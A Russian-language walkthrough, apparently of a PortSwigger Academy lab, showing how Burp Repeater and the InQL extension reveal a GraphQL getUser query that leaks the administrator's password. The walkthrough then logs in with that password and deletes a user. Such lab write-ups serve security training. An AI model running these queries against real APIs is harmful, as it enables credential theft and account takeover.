Зайдем на уязвимый ресурс и забьем в форму аутентификации любую связку логин-пароля 

Далее перейдем в `Proxy` ->` HTTP history` найдем данный запрос и отправим его в `Repeater`
и увидим, что такого пользователя просто не существует

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/2.%20Accidental%20exposure%20of%20private%20GraphQL%20fields/pics%20for%20walkthrough/1.png)

Далее выясним, что GraphQL работает по адресу `/graphql/v1`

и скопируем путь в расширение `InQL`

и увидим, что мы можем узнать информацию о пользователе по его ID
```
query {
    getUser(id: Int!) {
        id
        password
        username
    }
}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/2.%20Accidental%20exposure%20of%20private%20GraphQL%20fields/pics%20for%20walkthrough/2.png)

Скопируем данный запрос в Repeater с id = 1
```
query {
    getUser(id: 1) {
        id
        password
        username
    }
}
```
и получим ответ 
```
HTTP/2 200 OK
{
  "data": {
    "getUser": {
      "id": 1,
      "password": "oitayswtnldcl9xv7e4z",
      "username": "administrator"
    }
  }
}
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/2.%20Accidental%20exposure%20of%20private%20GraphQL%20fields/pics%20for%20walkthrough/3.png)

Зайдем по кредам `administrator:oitayswtnldcl9xv7e4z`

Перейдем в `admin panel` И удалим `carlos` как этого и требует задание и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/21.%20GraphQL%20API%20vulnerabilities/2.%20Accidental%20exposure%20of%20private%20GraphQL%20fields/pics%20for%20walkthrough/4.png)
